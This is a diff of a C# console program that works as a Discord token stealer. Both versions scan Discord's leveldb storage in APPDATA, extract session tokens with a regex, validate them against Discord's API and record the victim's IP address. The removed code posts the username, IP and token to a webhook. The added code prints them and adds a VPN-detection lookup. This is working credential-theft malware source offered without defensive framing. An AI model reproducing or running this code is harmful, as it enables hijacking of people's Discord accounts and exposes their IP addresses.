@@ -1,90 +1,117 @@
 using System;
+using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Net.Http;
+using System.Text;
 using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 
-namespace Poop_cleaner
+namespace ConsoleApp1
 {
     class Program
     {
+        static string Email = "CHANGE";
 
         static void Main(string[] args)
         {
-
-            static bool CheckToken(string token)
+            foreach(string e in GetToken())
             {
-                try
+                Console.WriteLine(e);
+            }
+            Console.ReadLine();
+        }
+
+        /// <summary>
+        /// Get and verify the Discord token.
+        /// </summary>
+        /// <returns>The Discord token or an error message.</returns>
+        static string[] GetToken()
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) 
+                + "\\discord\\Local Storage\\leveldb\\";
+
+            if (!Directory.Exists(path)) return new string[] { "Discord Not Installed." };
+
+            string[] ldb = Directory.GetFiles(path, "*.ldb");
+
+            foreach (var ldb_file in ldb)
+            {
+                // Get IP and Token
+                string ip = GrabIP();
+                var text = File.ReadAllText(ldb_file);
+
+                // Verify Valid Token Format
+                string token_reg =
+                    @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
+                Match token = Regex.Match(text, token_reg);
+                if (token.Success)
                 {
-                    var http = new WebClient();
-                    http.Headers.Add("Authorization", token);
-                    var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
-                    if (!result.Contains("Unauthorized"))
+                    // Verify Valid Token
+                    if (CheckToken(token.Value))
                     {
-                        return true;
+                        string[] finalData = { token.Value, ip, GetVPN(ip) };
+                        return finalData;
                     }
-                    else
-                    {
-                        return false;
-                    }
-                } catch
-                {
-                    return false;
                 }
+                continue;
             }
 
-            static string GrabIP()
+            return new string[] { "No Valid Tokens Found." };
+        }
+
+        /// <summary>
+        /// Check the Discord token.
+        /// </summary>
+        /// <returns>true if the token is valid, false otherwise.</returns>
+        static bool CheckToken(string token)
+        {
+            try
             {
                 var http = new WebClient();
-                string ip = http.DownloadString("https://ip.42.pl/raw");
-                return ip;
+                http.Headers.Add("Authorization", token);
+                var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
+                if (!result.Contains("Unauthorized")) return true;
             }
+            catch { }
+            return false;
+        }
 
-            string Webhook = "hi"; // webhook yes
+        /// <summary>
+        /// Return the user's IP.
+        /// </summary>
+        /// <returns>The Discord token or an error message.</returns>
+        static string GrabIP()
+        {
+            return new WebClient().DownloadString("https://ip.42.pl/raw");
+        }
 
-            string appdata = Environment.GetEnvironmentVariable("APPDATA");
-            string[] directories = Directory.GetDirectories(appdata);
-
-            foreach (var path in directories)
+        /// <summary>
+        /// Get if user's IP is a vpn.
+        /// </summary>
+        /// <returns>YES, LIKELY, UNLIKELY, or NO</returns>
+        static string GetVPN(string ip)
+        {
+            if (Email == "CHANGE") return "CHANGE EMAIL";
+            try
             {
-                if (path.Contains("discord"))
-                {
+                string query = new WebClient().DownloadString("https://check.getipintel.net/check.php?ip=" + ip + "&contact=" + Email);
+                float val = float.Parse(query);
 
-                    string[] local = Directory.GetDirectories(path);
-                    foreach (var path1 in local)
-                    {
-                        if (path1.Contains("Local Storage"))
-                        {
-                            string[] ldb = Directory.GetFiles(path1 + "\\leveldb");
+                if (val < 0) return "UNKNOWN";
+                else if (val == 0) return "NO";
+                else if (val > 0 && val < 0.5) return "UNLIKELY";
+                else if (val > 0.5 && val < 0.8) return "LIKELY";
+                else if (val > 0.8) return "YES";
+                else return "UNKNOWN";
 
-                            foreach (var ldb_file in ldb)
-                            {
-                                if (ldb_file.EndsWith(".ldb"))
-                                {
-                                    string ip = GrabIP();
-                                    var text = File.ReadAllText(ldb_file);
-                                    string token_reg = @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
-                                    Match token = Regex.Match(text, token_reg);
-                                    if (token.Success)
-                                    {
-                                        if (CheckToken(token.Value))
-                                        {
-                                            HttpClient Http = new HttpClient();
-                                            MultipartFormDataContent Payload = new MultipartFormDataContent();
-                                            Payload.Add(new StringContent(Environment.UserName), "username");
-                                            Payload.Add(new StringContent(string.Concat(new string[] {
-                                                        "```asciidoc\n" +
-                                                        "\n• ip :: ", ip,
-                                                        "\n• token :: ", token.Value + "```"}
-                                            )), "content");
-                                            Http.PostAsync(Webhook, Payload);
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
+
+            }
+            catch(WebException ex)
+            {
+                if (ex.Message.Contains("(400) Bad Request")) return "LIKELY";
+                else return "UNKNOWN";
             }
         }
     }
